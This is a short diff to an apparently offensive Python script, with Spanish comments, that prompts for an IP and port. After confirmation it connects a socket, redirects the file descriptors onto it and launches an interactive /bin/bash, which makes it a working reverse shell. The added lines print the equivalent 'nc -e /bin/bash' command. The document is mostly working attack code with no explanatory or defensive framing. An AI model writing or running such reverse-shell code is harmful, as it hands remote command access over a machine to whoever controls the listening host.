@@ -34,6 +34,9 @@ else:
 # Confirmar antes de ejecutar
 ejecutar = input(f"\033[92m¿Ejecutar sheldon a {ip} en el puerto {port}? [S/n']: \033[0m").strip().lower()
 if ejecutar in ['', 's']:
+    # Imprimir el comando completo a modo indicativo en azul
+    print_color(f"nc -e /bin/bash {ip} {port}", 94)
+    
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, port))
     dup2(s.fileno(), 0)
@@ -42,4 +45,3 @@ if ejecutar in ['', 's']:
     run(["/bin/bash", "-i"])
 else:
     print_color("Operación cancelada.", 91)
-
